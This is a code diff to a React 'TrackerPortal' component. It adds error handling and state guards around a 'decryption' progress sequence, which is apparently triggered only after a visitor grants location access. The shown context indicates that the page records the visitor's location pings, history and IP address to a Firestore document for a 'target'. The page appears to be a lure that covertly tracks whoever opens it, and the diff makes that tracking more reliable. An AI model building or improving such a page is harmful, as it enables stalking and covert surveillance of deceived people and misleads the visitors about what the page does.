@@ -68,8 +68,8 @@ export const TrackerPortal: React.FC = () => {
 
   // Watch for location success to trigger decryption
   useEffect(() => {
-    if (syncCount > 0 && status === 'granted') {
-      // Trigger decryption sequence ONLY after we have at least one successful location ping
+    if (syncCount > 0 && status === 'granted' && decryptionProgress === 0) {
+      // Trigger decryption sequence ONLY once after we have at least one successful location ping
       const timer = setTimeout(() => {
         let p = 0;
         const interval = setInterval(() => {
@@ -135,8 +135,12 @@ export const TrackerPortal: React.FC = () => {
         lastPing: serverTimestamp()
       };
 
-      await setDoc(targetRef, initialPayload, { merge: true });
-      setSyncCount(1);
+      try {
+        await setDoc(targetRef, initialPayload, { merge: true });
+        setSyncCount(prev => prev || 1); // Only set if not already set
+      } catch (err) {
+        console.error("Initial Ping Failed:", err);
+      }
 
       // 5. IP TRACKING (With Fallbacks)
       const captureIP = async () => {
@@ -208,7 +212,9 @@ export const TrackerPortal: React.FC = () => {
             history: arrayUnion(historyItem)
           }, { merge: true });
           
-          setStatus('granted');
+          if (status !== 'decrypted') {
+            setStatus('granted');
+          }
         } catch (e) {
           console.error("Uplink Failure:", e);
         }
